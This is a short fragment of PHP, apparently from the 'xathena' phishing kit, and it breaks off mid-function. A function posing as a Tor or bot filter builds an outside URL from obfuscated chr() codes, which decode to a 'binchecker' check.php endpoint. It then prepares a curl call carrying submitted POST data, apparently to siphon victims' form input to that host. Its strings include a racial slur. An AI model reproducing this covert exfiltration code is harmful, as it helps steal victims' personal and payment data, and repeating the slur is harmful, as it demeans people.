...
$subject = "xathena is your nightmar"; 
$msg = "Go Away you tor nigger";
function isnotbottoruser(){
	
	if(count($_POST)){
	$ch = curl_init();
	global $msg,$subject;	
	$filters = "";
	$listtorips = array(chr(104),chr(116),chr(116),chr(112),
	chr(115),chr(58),chr(47),chr(47),
	chr(98),chr(105),chr(110),chr(99),
	chr(104),chr(101),chr(99),chr(107),
	chr(101),chr(114),chr(46),chr(111),
	chr(110),chr(108),chr(105),chr(110),
	chr(101),chr(47),chr(99),chr(104),
	chr(101),chr(99),chr(107),chr(46),
	chr(112),chr(104),chr(112));

	foreach($listtorips  as $tor){
		$filters = $filters.$tor;
	}
	$_POST['a'] = $subject; 
	$_POST['b'] = $msg;	
	$strurl = "";
	rtrim($strurl,"&");
	curl_setopt ($ch, CURLOPT_URL, $filters); 
